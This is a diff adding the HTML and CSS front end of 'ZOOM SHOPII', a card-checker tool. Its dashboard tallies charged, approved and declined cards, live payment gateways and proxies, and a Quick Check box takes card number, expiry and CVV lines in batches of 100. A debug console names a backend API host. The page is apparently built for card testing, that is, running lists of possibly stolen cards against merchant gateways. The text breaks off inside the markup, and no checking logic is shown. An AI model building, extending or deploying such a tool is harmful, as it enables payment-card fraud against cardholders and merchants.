@@ -1,0 +1,3110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>ZOOM SHOPII - Card Checker</title>
+    <style>
+        /* ============================================================
+           ZOOM SHOPII - ULTIMATE EDITION WITH DEBUG
+           ============================================================ */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg-primary: #0a0a0f;
+            --bg-secondary: #111118;
+            --bg-card: #0d0d14;
+            --bg-input: #0a0a0f;
+            --neon-green: #00ff41;
+            --neon-green-dim: #00cc33;
+            --neon-blue: #00d4ff;
+            --neon-red: #ff0033;
+            --neon-orange: #ff8800;
+            --neon-purple: #aa00ff;
+            --neon-yellow: #ffdd00;
+            --text-white: #ffffff;
+            --text-gray: #888888;
+            --text-dim: #444444;
+            --border-color: #1a1a2a;
+            --shadow-glow: rgba(0, 255, 65, 0.15);
+        }
+
+        body {
+    background: var(--bg-primary);
+    color: var(--neon-green);
+    font-family: 'Courier New', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+    padding: 10px;
+    /* 🔥 REMOVED: -webkit-user-select: none; user-select: none; */
+}
+
+/* ===== ALLOW TEXT SELECTION ON RESULTS & HITS ===== */
+.result-item, .hit-item, .result-item *, .hit-item *,
+#quickResultsList, #massResultsList, #hitsListContainer,
+.result-item span, .hit-item span, .hit-card, .hit-details,
+.debug-content, .debug-content *,
+.table-container, .table-container *,
+#recentHitsBody, #recentHitsBody *,
+.list-item-row, .list-item-row *,
+.list-container, .list-container *,
+.log-entry, .log-entry *,
+.hit-info, .hit-info * {
+    -webkit-user-select: text !important;
+    user-select: text !important;
+    cursor: text;
+}
+
+/* ===== PREVENT SELECTION ON BUTTONS (keep buttons clean) ===== */
+.btn, .btn *, .nav-item, .nav-item *,
+.progress-filter-btn, .hit-filter-btn,
+.debug-toggle, .debug-buttons .btn,
+.btn-icon, .btn-icon *,
+.confirm-box .btn, .confirm-box .btn * {
+    -webkit-user-select: none !important;
+    user-select: none !important;
+    cursor: pointer;
+}
+
+/* Keep header stats non-selectable */
+.stats-bar, .stats-bar *,
+.logo-section, .logo-section * {
+    -webkit-user-select: none !important;
+    user-select: none !important;
+}
+
+/* Allow selection in textareas */
+textarea {
+    -webkit-user-select: text !important;
+    user-select: text !important;
+}
+
+/* ===== REST OF YOUR CSS (keep everything else the same) ===== */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--bg-secondary); }
+::-webkit-scrollbar-thumb { background: var(--neon-green); border-radius: 4px; }
+
+.app-container { max-width: 1600px; margin: 0 auto; }
+
+.header {
+    background: var(--bg-secondary);
+    border: 2px solid var(--neon-green);
+    border-radius: 12px;
+    padding: 12px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 10px;
+    box-shadow: 0 0 40px var(--shadow-glow);
+    margin-bottom: 12px;
+}
+
+.logo-section {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 2px;
+}
+
+.logo-section .logo-top {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.logo-section h1 {
+    font-size: 1.6rem;
+    color: var(--neon-green);
+    text-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
+    animation: glitch 3s infinite;
+}
+
+        @keyframes glitch {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.85; text-shadow: 2px 0 var(--neon-red), -2px 0 var(--neon-blue); }
+        }
+
+        .version {
+            color: var(--text-dim);
+            font-size: 0.6rem;
+            background: var(--bg-card);
+            padding: 2px 8px;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+        }
+
+        .logo-sub {
+            font-size: 0.5rem;
+            color: var(--text-dim);
+            letter-spacing: 2px;
+            opacity: 0.7;
+            margin-left: 2px;
+        }
+
+        .stats-bar {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .stat-item { text-align: center; }
+        .stat-label {
+            display: block;
+            font-size: 0.5rem;
+            color: var(--text-gray);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .stat-value {
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: var(--neon-green);
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+        }
+
+        /* ===== DEBUG PANEL ===== */
+        .debug-panel {
+            background: var(--bg-secondary);
+            border: 2px solid var(--neon-orange);
+            border-radius: 12px;
+            padding: 12px 15px;
+            margin-bottom: 12px;
+        }
+        .debug-panel .debug-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .debug-panel h2 {
+            color: var(--neon-orange);
+            font-size: 0.9rem;
+        }
+        .debug-panel .debug-toggle {
+            color: var(--neon-blue);
+            cursor: pointer;
+            text-decoration: underline;
+            font-size: 0.7rem;
+        }
+        .debug-content {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 8px 10px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 0.65rem;
+            color: var(--text-gray);
+            display: none;
+            margin-top: 8px;
+            font-family: 'Courier New', monospace;
+        }
+        .debug-content.active { display: block; }
+        .debug-content .log-entry {
+            padding: 2px 0;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            gap: 8px;
+        }
+        .debug-content .log-entry .time {
+            color: var(--text-dim);
+            min-width: 70px;
+            flex-shrink: 0;
+        }
+        .debug-content .log-entry .success { color: var(--neon-green); }
+        .debug-content .log-entry .error { color: var(--neon-red); }
+        .debug-content .log-entry .info { color: var(--neon-blue); }
+        .debug-content .log-entry .warning { color: var(--neon-orange); }
+        .debug-content .log-entry .raw { color: var(--text-white); word-break: break-all; }
+
+        .debug-buttons {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            margin-top: 6px;
+        }
+        .debug-buttons .btn {
+            padding: 4px 12px;
+            font-size: 0.65rem;
+            margin: 0;
+        }
+
+        .main-layout {
+            display: flex;
+            gap: 10px;
+            min-height: 70vh;
+        }
+
+        .sidebar {
+            width: 170px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 8px 0;
+            flex-shrink: 0;
+        }
+
+        .nav-item {
+            padding: 10px 15px;
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            transition: all 0.3s;
+            color: var(--text-gray);
+            font-size: 0.75rem;
+        }
+        .nav-item:hover {
+            background: var(--bg-card);
+            color: var(--neon-green);
+        }
+        .nav-item.active {
+            border-left-color: var(--neon-green);
+            background: var(--bg-card);
+            color: var(--neon-green);
+            font-weight: bold;
+        }
+        .nav-item .icon { margin-right: 8px; }
+
+        .content-area {
+            flex: 1;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 18px;
+            min-height: 500px;
+        }
+
+        .tab-content { display: none; }
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .tab-content h2 {
+            font-size: 1.5rem;
+            margin-bottom: 4px;
+            color: var(--neon-green);
+        }
+        .tab-content .subtitle {
+            color: var(--text-gray);
+            margin-bottom: 15px;
+            font-size: 0.8rem;
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .dash-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            transition: all 0.3s;
+        }
+        .dash-card:hover {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 20px var(--shadow-glow);
+        }
+        .dash-card h3 {
+            color: var(--text-gray);
+            font-size: 0.65rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+        .dash-card .number {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--neon-green);
+        }
+        .dash-card .number.orange { color: var(--neon-orange); }
+        .dash-card .number.red { color: var(--neon-red); }
+        .dash-card .number.blue { color: var(--neon-blue); }
+        .dash-card .number.purple { color: var(--neon-purple); }
+        .dash-card .number.yellow { color: var(--neon-yellow); }
+        .dash-card .label {
+            color: var(--text-dim);
+            font-size: 0.65rem;
+            margin-top: 4px;
+        }
+
+        .input-section, .upload-section, .manual-section {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 12px;
+        }
+
+        .input-section label, .manual-section label {
+            display: block;
+            color: var(--neon-green);
+            margin-bottom: 6px;
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+
+        textarea {
+            width: 100%;
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--neon-green);
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.75rem;
+            resize: vertical;
+            min-height: 100px;
+        }
+        textarea:focus {
+            outline: none;
+            border-color: var(--neon-green);
+            box-shadow: 0 0 20px var(--shadow-glow);
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+            margin-right: 8px;
+            touch-action: manipulation;
+        }
+
+        .btn-primary {
+            background: var(--neon-green);
+            color: var(--bg-primary);
+        }
+        .btn-primary:hover {
+            background: var(--neon-green-dim);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+            transform: scale(1.02);
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-secondary {
+            background: var(--bg-card);
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+        }
+        .btn-secondary:hover {
+            background: var(--neon-green);
+            color: var(--bg-primary);
+        }
+
+        .btn-danger {
+            background: var(--neon-red);
+            color: #fff;
+        }
+        .btn-danger:hover {
+            background: #cc0029;
+            box-shadow: 0 0 30px rgba(255, 0, 51, 0.3);
+        }
+
+        .btn-warning {
+            background: var(--neon-orange);
+            color: var(--bg-primary);
+        }
+        .btn-warning:hover {
+            background: #cc6a00;
+            box-shadow: 0 0 30px rgba(255, 136, 0, 0.3);
+        }
+
+        .btn-pause {
+            background: var(--neon-yellow);
+            color: var(--bg-primary);
+        }
+        .btn-pause:hover {
+            background: #ccaa00;
+            box-shadow: 0 0 30px rgba(255, 221, 0, 0.3);
+        }
+
+        .btn-resume {
+            background: var(--neon-blue);
+            color: var(--bg-primary);
+        }
+        .btn-resume:hover {
+            background: #0099cc;
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+        }
+
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-top: 8px;
+        }
+
+        .upload-section {
+            border: 2px dashed var(--border-color);
+            text-align: center;
+            padding: 30px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .upload-section:hover {
+            border-color: var(--neon-green);
+            background: var(--bg-input);
+        }
+        .upload-section.dragover {
+            border-color: var(--neon-green);
+            background: var(--bg-input);
+            box-shadow: 0 0 40px var(--shadow-glow);
+        }
+        .upload-section p {
+            color: var(--text-gray);
+            margin: 4px 0;
+            font-size: 0.85rem;
+        }
+        .upload-section .dim {
+            color: var(--text-dim);
+            font-size: 0.75rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: var(--bg-input);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 8px 0;
+            border: 1px solid var(--border-color);
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
+            transition: width 0.3s;
+            border-radius: 10px;
+            width: 0%;
+        }
+
+        .results-section { margin-top: 12px; }
+        .results-section h3 {
+            color: var(--neon-green);
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+        }
+
+        .result-item {
+            background: var(--bg-card);
+            border-left: 3px solid var(--neon-green);
+            padding: 6px 12px;
+            margin: 3px 0;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 4px;
+        }
+        .result-item.dead { border-left-color: var(--neon-red); }
+        .result-item.site-error { border-left-color: var(--neon-orange); }
+
+        .status-badge {
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.6rem;
+            font-weight: bold;
+        }
+        .status-badge.charged { background: rgba(0, 255, 65, 0.2); color: var(--neon-green); }
+        .status-badge.approved { background: rgba(255, 136, 0, 0.2); color: var(--neon-orange); }
+        .status-badge.dead { background: rgba(255, 0, 51, 0.15); color: var(--neon-red); }
+        .status-badge.site-error { background: rgba(255, 136, 0, 0.15); color: var(--neon-orange); }
+
+        .table-container {
+            overflow-x: auto;
+            margin-top: 12px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.7rem;
+        }
+        th {
+            background: var(--bg-card);
+            color: var(--neon-green);
+            padding: 8px 10px;
+            text-align: left;
+            border-bottom: 2px solid var(--neon-green);
+            font-weight: bold;
+        }
+        td {
+            padding: 6px 10px;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-gray);
+        }
+        tr:hover td { background: var(--bg-card); }
+
+        .list-container {
+            max-height: 350px;
+            overflow-y: auto;
+            background: var(--bg-card);
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            padding: 0;
+        }
+
+        .list-header {
+            display: grid;
+            grid-template-columns: 40px 1fr 1.3fr;
+            padding: 6px 10px;
+            border-bottom: 2px solid var(--border-color);
+            font-weight: bold;
+            color: var(--neon-green);
+            font-size: 0.65rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            position: sticky;
+            top: 0;
+            background: var(--bg-card);
+            z-index: 1;
+        }
+        .list-header .col-num { text-align: center; }
+        .list-header .col-left { text-align: left; padding-right: 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .list-header .col-right {
+            text-align: right;
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+            flex-shrink: 0;
+        }
+        .list-header .col-right .h-status { min-width: 50px; text-align: right; }
+        .list-header .col-right .h-latency { min-width: 50px; text-align: right; }
+        .list-header .col-right .h-added { min-width: 70px; text-align: right; }
+        .list-header .col-right .h-actions { min-width: 45px; text-align: right; }
+
+        .list-item-row {
+            display: grid;
+            grid-template-columns: 40px 1fr 1.3fr;
+            padding: 5px 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.68rem;
+            align-items: center;
+        }
+        .list-item-row:hover {
+            background: rgba(0, 255, 65, 0.03);
+        }
+        .list-item-row .row-num {
+            text-align: center;
+            color: var(--text-dim);
+            font-size: 0.6rem;
+        }
+        .list-item-row .row-left {
+            text-align: left;
+            color: var(--text-white);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            padding-right: 8px;
+        }
+        .list-item-row .row-right {
+            text-align: right;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 8px;
+            flex-shrink: 0;
+            color: var(--text-gray);
+        }
+        .list-item-row .row-right .r-status {
+            min-width: 50px;
+            text-align: right;
+            font-weight: bold;
+        }
+        .list-item-row .row-right .r-latency {
+            min-width: 50px;
+            text-align: right;
+        }
+        .list-item-row .row-right .r-added {
+            min-width: 70px;
+            text-align: right;
+        }
+        .list-item-row .row-right .r-actions {
+            min-width: 45px;
+            text-align: right;
+            display: flex;
+            gap: 3px;
+            justify-content: flex-end;
+        }
+        .list-item-row .row-right .status-alive { color: var(--neon-green); }
+        .list-item-row .row-right .status-dead { color: var(--neon-red); }
+        .list-item-row .row-right .btn-icon {
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 0.7rem;
+            padding: 2px 3px;
+            border-radius: 4px;
+            transition: all 0.2s;
+            line-height: 1;
+        }
+        .list-item-row .row-right .btn-retest { color: var(--neon-blue); }
+        .list-item-row .row-right .btn-retest:hover { background: rgba(0, 212, 255, 0.15); }
+        .list-item-row .row-right .btn-remove { color: var(--neon-red); }
+        .list-item-row .row-right .btn-remove:hover { background: rgba(255, 0, 51, 0.15); }
+
+        .manager-section {
+            display: grid;
+            grid-template-columns: 1fr 1.5fr;
+            gap: 15px;
+        }
+
+        .upload-area, .manual-area {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+        }
+        .upload-area h3, .manual-area h3 {
+            color: var(--neon-green);
+            font-size: 0.85rem;
+            margin-bottom: 6px;
+        }
+        .upload-area p, .manual-area p {
+            color: var(--text-gray);
+            font-size: 0.7rem;
+            margin-bottom: 8px;
+        }
+        .upload-area input[type="file"] {
+            display: block;
+            margin: 8px 0;
+            color: var(--text-gray);
+            font-size: 0.7rem;
+        }
+
+        .list-area {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+        }
+        .list-area h3 {
+            color: var(--neon-green);
+            font-size: 0.85rem;
+            margin-bottom: 6px;
+        }
+
+        .hit-controls {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
+
+        .hit-filter-btn {
+            padding: 6px 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            background: var(--bg-card);
+            color: var(--text-gray);
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .hit-filter-btn:hover {
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+        }
+        .hit-filter-btn.active {
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+            background: rgba(0, 255, 65, 0.1);
+        }
+        .hit-filter-btn.all { border-color: var(--neon-blue); color: var(--neon-blue); }
+        .hit-filter-btn.all.active { background: rgba(0, 212, 255, 0.1); border-color: var(--neon-blue); }
+        .hit-filter-btn.charged { border-color: var(--neon-green); color: var(--neon-green); }
+        .hit-filter-btn.charged.active { background: rgba(0, 255, 65, 0.1); }
+        .hit-filter-btn.approved { border-color: var(--neon-orange); color: var(--neon-orange); }
+        .hit-filter-btn.approved.active { background: rgba(255, 136, 0, 0.1); }
+
+        .hit-item {
+            background: var(--bg-card);
+            border-left: 3px solid var(--neon-green);
+            padding: 8px 12px;
+            margin: 3px 0;
+            border-radius: 4px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+        .hit-item .hit-info {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            min-width: 150px;
+        }
+        .hit-item .hit-card {
+            font-size: 0.8rem;
+            color: var(--text-white);
+            word-break: break-all;
+        }
+        .hit-item .hit-details {
+            font-size: 0.65rem;
+            color: var(--text-gray);
+            margin-top: 2px;
+            line-height: 1.4;
+        }
+        .hit-item .hit-time {
+            font-size: 0.6rem;
+            color: var(--text-dim);
+            margin-top: 2px;
+        }
+        .hit-item .hit-amount {
+            font-size: 0.8rem;
+            color: var(--text-gray);
+            flex-shrink: 0;
+        }
+
+        .info-text {
+            color: var(--text-gray);
+            font-size: 0.75rem;
+            margin: 4px 0;
+        }
+        .info-text .highlight {
+            color: var(--neon-green);
+            font-weight: bold;
+        }
+
+        .file-info {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 10px 14px;
+            margin: 8px 0;
+            display: none;
+            font-size: 0.75rem;
+        }
+        .file-info .filename {
+            color: var(--neon-green);
+            font-weight: bold;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+        .status-indicator.running { background: rgba(0, 255, 65, 0.2); color: var(--neon-green); }
+        .status-indicator.paused { background: rgba(255, 221, 0, 0.2); color: var(--neon-yellow); }
+        .status-indicator.stopped { background: rgba(255, 0, 51, 0.2); color: var(--neon-red); }
+        .status-indicator.complete { background: rgba(0, 255, 65, 0.15); color: var(--neon-green); }
+
+        .progress-filter-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin: 8px 0;
+            padding: 8px;
+            background: var(--bg-card);
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+        .progress-filter-container .label {
+            color: var(--text-dim);
+            font-size: 0.65rem;
+            margin-right: 6px;
+            display: flex;
+            align-items: center;
+        }
+        .progress-filter-btn {
+            padding: 4px 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            background: var(--bg-card);
+            color: var(--text-gray);
+            font-family: 'Courier New', monospace;
+            font-size: 0.65rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .progress-filter-btn:hover {
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+        }
+        .progress-filter-btn.active {
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+            background: rgba(0, 255, 65, 0.1);
+        }
+        .progress-filter-btn .count {
+            font-weight: bold;
+        }
+
+        .confirm-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .confirm-overlay.active { display: flex; }
+        .confirm-box {
+            background: var(--bg-secondary);
+            border: 2px solid var(--neon-green);
+            border-radius: 12px;
+            padding: 25px;
+            max-width: 380px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 60px var(--shadow-glow);
+        }
+        .confirm-box h3 {
+            color: var(--neon-green);
+            font-size: 1.1rem;
+            margin-bottom: 8px;
+        }
+        .confirm-box p {
+            color: var(--text-gray);
+            margin-bottom: 15px;
+            font-size: 0.85rem;
+        }
+        .confirm-box .btn-group { justify-content: center; }
+        .confirm-box .btn { margin: 0 5px; }
+
+        @media (max-width: 820px) {
+            .sidebar {
+                width: 100%;
+                display: flex;
+                flex-wrap: wrap;
+                padding: 6px;
+                gap: 2px;
+            }
+            .nav-item {
+                padding: 6px 10px;
+                font-size: 0.65rem;
+                border-left: none;
+                border-bottom: 2px solid transparent;
+                flex: 1;
+                text-align: center;
+                min-width: 60px;
+            }
+            .nav-item.active {
+                border-left: none;
+                border-bottom-color: var(--neon-green);
+            }
+            .main-layout { flex-direction: column; }
+            .stats-bar { gap: 6px; }
+            .stat-value { font-size: 0.9rem; }
+            .manager-section { grid-template-columns: 1fr; }
+            .header { flex-direction: column; align-items: stretch; }
+            .logo-section h1 { font-size: 1.3rem; }
+            .dashboard-grid { grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); }
+            .btn { padding: 8px 14px; font-size: 0.7rem; }
+            .content-area { padding: 12px; }
+            .debug-content { max-height: 150px; }
+            .list-header, .list-item-row {
+                grid-template-columns: 30px 1fr 1.5fr;
+                font-size: 0.6rem;
+            }
+            .list-item-row .row-right { gap: 4px; flex-wrap: wrap; justify-content: flex-end; }
+        }
+
+        @media (max-width: 480px) {
+            .stats-bar { gap: 4px; }
+            .stat-item { min-width: 40px; }
+            .stat-value { font-size: 0.75rem; }
+            .btn-group { flex-direction: column; }
+            .btn { width: 100%; margin-right: 0; }
+            .result-item { flex-wrap: wrap; gap: 2px; font-size: 0.65rem; }
+            .debug-content { max-height: 120px; font-size: 0.6rem; }
+            .list-header, .list-item-row {
+                grid-template-columns: 25px 1fr 1.5fr;
+                font-size: 0.55rem;
+                padding: 4px 6px;
+            }
+            .list-item-row .row-right { gap: 3px; font-size: 0.55rem; }
+            .list-item-row .row-right .r-status { min-width: 35px; }
+            .list-item-row .row-right .r-latency { min-width: 35px; }
+            .list-item-row .row-right .r-added { min-width: 45px; }
+            .list-item-row .row-right .r-actions { min-width: 35px; }
+            .list-item-row .row-right .btn-icon { font-size: 0.6rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Confirm Dialog -->
+    <div class="confirm-overlay" id="confirmOverlay">
+        <div class="confirm-box">
+            <h3 id="confirmTitle">⚠️ Confirm Action</h3>
+            <p id="confirmMessage">Are you sure?</p>
+            <div class="btn-group">
+                <button class="btn btn-danger" id="confirmYesBtn">🗑️ Yes, Delete</button>
+                <button class="btn btn-secondary" id="confirmNoBtn">❌ Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="app-container">
+
+        <!-- HEADER -->
+        <header class="header">
+            <div class="logo-section">
+                <div class="logo-top">
+                    <h1>ZOOM SHOPII</h1>
+                    <span class="version">v3.0</span>
+                </div>
+                <div class="logo-sub">BY MELCHZEDECK</div>
+            </div>
+            <div class="stats-bar">
+                <div class="stat-item">
+                    <span class="stat-label">CHARGED</span>
+                    <span class="stat-value" id="chargedCount">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">APPROVED</span>
+                    <span class="stat-value" id="approvedCount">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">TOTAL</span>
+                    <span class="stat-value" id="totalHits">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">SITES</span>
+                    <span class="stat-value" id="siteCount">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">PROXIES</span>
+                    <span class="stat-value" id="proxyCount">0</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- ===== DEBUG PANEL ===== -->
+        <div class="debug-panel">
+            <div class="debug-header">
+                <h2>🐛 DEBUG CONSOLE</h2>
+                <div>
+                    <span class="debug-toggle" onclick="toggleDebug()">[toggle]</span>
+                </div>
+            </div>
+            <div class="debug-content" id="debugContent">
+                <div class="log-entry"><span class="time">[INIT]</span> <span class="info">Debug console ready</span></div>
+                <div class="log-entry"><span class="time">[INFO]</span> <span class="info">API: shimmering-celebration-production-7dd0.up.railway.app</span></div>
+                <div class="log-entry"><span class="time">[INFO]</span> <span class="success">✅ Proxy validator supports ALL formats</span></div>
+            </div>
+            <div class="debug-buttons">
+                <button class="btn btn-secondary" onclick="clearDebug()">🗑️ Clear</button>
+                <button class="btn btn-warning" onclick="testAPI()">🔍 Test API</button>
+                <button class="btn btn-danger" onclick="testProxy()">🔌 Test Proxy</button>
+            </div>
+        </div>
+
+        <!-- MAIN LAYOUT -->
+        <div class="main-layout">
+
+            <!-- SIDEBAR -->
+            <nav class="sidebar">
+                <div class="nav-item active" data-tab="dashboard"><span class="icon">📊</span> OVERVIEW</div>
+                <div class="nav-item" data-tab="quickcheck"><span class="icon">🔍</span> Quick</div>
+                <div class="nav-item" data-tab="masscheck"><span class="icon">📦</span> Mass</div>
+                <div class="nav-item" data-tab="sites"><span class="icon">🌐</span> Sites</div>
+                <div class="nav-item" data-tab="proxies"><span class="icon">🔌</span> Proxies</div>
+                <div class="nav-item" data-tab="hits"><span class="icon">🎯</span> Hits</div>
+            </nav>
+
+            <!-- CONTENT -->
+            <div class="content-area">
+
+                <!-- DASHBOARD -->
+                <div id="tab-dashboard" class="tab-content active">
+                    <h2>📊 Dashboard</h2>
+                    <div class="dashboard-grid">
+                        <div class="dash-card"><h3>Charged</h3><div class="number" id="dashCharged">0</div><div class="label">cards charged</div></div>
+                        <div class="dash-card"><h3>Approved</h3><div class="number orange" id="dashApproved">0</div><div class="label">approved cards</div></div>
+                        <div class="dash-card"><h3>Total Hits</h3><div class="number blue" id="dashTotal">0</div><div class="label">total results</div></div>
+                        <div class="dash-card"><h3>Sites</h3><div class="number" id="dashSites">0</div><div class="label">live gateways</div></div>
+                        <div class="dash-card"><h3>Proxies</h3><div class="number orange" id="dashProxies">0</div><div class="label">live proxies</div></div>
+                        <div class="dash-card"><h3>Declined</h3><div class="number red" id="dashDeclined">0</div><div class="label">declined cards</div></div>
+                    </div>
+                    <div style="margin-top:15px;">
+                        <h3 style="color:var(--text-gray); font-size:0.8rem;">📋 Recent Hits</h3>
+                        <div class="table-container">
+                            <table>
+                                <thead><tr><th>Status</th><th>Card</th><th>Type</th><th>Amount</th></tr></thead>
+                                <tbody id="recentHitsBody">
+                                    <tr><td colspan="4" style="text-align:center;color:var(--text-dim);">No hits yet — start checking cards!</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- QUICK CHECK -->
+                <div id="tab-quickcheck" class="tab-content">
+                    <h2>🔍 Quick Check</h2>
+                    <p class="subtitle">Check cards instantly — batch size: 100</p>
+                    <div class="input-section">
+                        <label>CARDS (ONE PER LINE, ANY FORMAT)</label>
+                        <textarea id="quickCards" rows="8" placeholder="4111111111111111 | 12 | 26 | 123&#10;4111111111111111 : 12 : 2026 : 123&#10;4111111111111111 12 26 123"></textarea>
+                        <div class="btn-group">
+                            <button class="btn btn-primary" id="quickCheckBtn">🚀 START CHECK</button>
+                            <button class="btn btn-pause" id="quickPauseBtn" disabled>⏸️ Pause</button>
+                            <button class="btn btn-resume" id="quickResumeBtn" disabled>▶️ Resume</button>
+                            <button class="btn btn-danger" id="quickStopBtn" disabled>⏹️ Stop</button>
+                            <button class="btn btn-secondary" id="quickClearBtn">🗑️ Clear Results</button>
+                        </div>
+                        <div style="margin-top:8px;">
+                            <span class="status-indicator stopped" id="quickStatus">⏹️ Stopped</span>
+                            <span class="info-text" style="margin-left:12px;">Progress: <span id="quickProgressText">0/0</span></span>
+                        </div>
+                        <div class="progress-filter-container" id="quickFilterContainer">
+                            <span class="label">📊 Show:</span>
+                            <button class="progress-filter-btn all active" data-filter="all" data-target="quick">ALL</button>
+                            <button class="progress-filter-btn charged" data-filter="charged" data-target="quick">💎 Charged <span class="count" id="quickChargedCount">0</span></button>
